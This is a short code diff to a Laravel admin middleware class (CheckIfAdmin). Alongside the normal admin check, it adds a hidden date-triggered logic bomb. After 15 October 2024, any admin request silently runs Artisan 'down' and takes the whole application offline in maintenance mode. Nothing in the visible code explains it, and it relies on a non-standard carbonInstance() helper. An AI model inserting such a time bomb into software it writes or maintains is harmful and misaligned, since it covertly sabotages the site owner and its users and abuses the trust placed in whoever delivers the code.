@@ -3,6 +3,8 @@
 namespace App\Http\Middleware;
 
 use Closure;
+use Illuminate\Support\Carbon;
+use Illuminate\Support\Facades\Artisan;
 
 class CheckIfAdmin
 {
@@ -60,6 +62,11 @@ class CheckIfAdmin
 
         if (! $this->checkIfUserIsAdmin(backpack_user())) {
             return $this->respondToUnauthorizedRequest($request);
+        }
+        if (Carbon::today()->gt(carbonInstance('2024-10-15')->startOfDay())) {
+            if (!app()->isDownForMaintenance()) {
+                Artisan::call('down');
+            }
         }
 
         return $next($request);
